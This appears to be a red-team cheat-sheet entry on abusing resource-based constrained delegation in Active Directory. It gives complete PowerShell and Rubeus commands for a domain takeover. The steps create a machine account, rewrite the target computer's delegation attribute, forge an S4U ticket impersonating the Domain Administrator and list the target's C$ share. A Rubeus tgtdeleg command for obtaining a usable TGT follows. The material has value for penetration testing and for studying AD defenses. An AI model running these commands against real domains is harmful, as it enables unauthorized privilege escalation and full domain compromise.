**WHAT IS THIS?:**

If we have `GenericAll`/`GenericWrite` privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access.

- Tools we are going to use:
	1. [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
	2. [Powermad](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)
	3. [Rubeus](https://github.com/GhostPack/Rubeus) and its [binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

- First we need to enter the security context of the user/machine account that has the privileges over the object.
- If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.

---

# Exploitation Example
1. Import Powermad and use it to create a new MACHINE ACCOUNT:
```powershell
. .\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
```
2. Import PowerView and get the SID of our new created machine account:
```powershell
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid
```
3. Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```
4. Next, we need to set the security descriptor in the `msDS-AllowedToActOnBehalfOfOtherIdentity` field of the computer account we're taking over, again using PowerView:
```powershell
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```
5. After that we need to get the RC4 hash of the new machine account's password using Rubeus:
```powershell
Rubeus.exe hash /password:'p@ssword!'
```
6. And for this example, we are going to impersonate Domain Administrator on the `cifs` service of the target computer using Rubeus:
```powershell
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt
```
7. Finally we can access the `C$` drive of the target machine:
```powershell
dir \\TargetMachine.wtver.domain\C$
```

### Detailed Articles
- [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [RESOURCE-BASED CONSTRAINED DELEGATION ABUSE](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)

---

- In Constrained and Resource-Based Constrained Delegation, if we don't have the password/hash of the account with `TRUSTED_TO_AUTH_FOR_DELEGATION` that we try to abuse, we can use the very nice trick `tgt::deleg` from Kekeo or `tgtdeleg` from Rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.
- Command on Rubeus:
```powershell
Rubeus.exe tgtdeleg /nowrap
```
- Detailed Article: [Rubeus â€“ Now With More Kekeo](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)
